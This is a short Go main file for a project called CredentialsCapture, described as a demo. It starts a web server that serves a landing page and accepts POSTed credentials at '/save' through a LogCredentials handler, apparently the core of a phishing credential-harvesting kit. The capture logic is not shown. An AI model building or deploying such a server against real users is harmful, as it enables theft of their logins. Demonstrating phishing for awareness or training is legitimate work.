/*
	CredentialsCapture
	(C) Mark Ackroyd


	Written as a demo

*/
package main

import (
	"log"
	"net/http"
	"time"

	config "github.com/acky666/CredentialsCapture/config"
	"github.com/acky666/CredentialsCapture/controllers"
	l "github.com/acky666/ackyLog"
	"github.com/gorilla/mux"

	_ "github.com/pdrum/swagger-automation/docs"
)

// Git Commit. (injected using the -ldflags directive in the go compiler so you can see the exact build running in production)
var GitCommit string = "Development"
var VERSION string = "Development"

func main() {

	l.INFO(` 
_________                    .___     _________                __                        
\_   ___ \_______   ____   __| _/_____\_   ___ \_____  _______/  |_ __ _________   ____  
/    \  \/\_  __ \_/ __ \ / __ |/  ___/    \  \/\__  \ \____ \   __\  |  \_  __ \_/ __ \ 
\     \____|  | \/\  ___// /_/ |\___ \\     \____/ __ \|  |_> >  | |  |  /|  | \/\  ___/ 
 \______  /|__|    \___  >____ /____  >\______  (____  /   __/|__| |____/ |__|    \___  >
        \/             \/     \/    \/        \/     \/|__|                           \/
	`)

	config.VERSION = VERSION

	if config.Get("LogColours") == "NO" {
		l.SHOWCOLOURS = false
	}

	l.INFO("GitCommit: " + GitCommit + " Project:" + config.PROJECT + " Version:" + VERSION + " Host:" + config.HOSTNAME + " Env:" + config.Get("ENV"))
	l.INFO("DSN:" + config.Get("DatabaseDSN_LOG"))

	l.INFO("Starting HTTP Server on " + config.Get("BIND"))

	MUXHandler := mux.NewRouter()
	MUXHandler.HandleFunc("/", controllers.ServeLanding)
	MUXHandler.HandleFunc("/save", controllers.LogCredentials).Methods("POST")

	http80srv := &http.Server{
		Handler:      MUXHandler,
		ReadTimeout:  5 * time.Second,
		WriteTimeout: 5 * time.Second,
		Addr:         config.Get("BIND"),
	}

	// Start Server
	log.Fatal(http80srv.ListenAndServe())

}
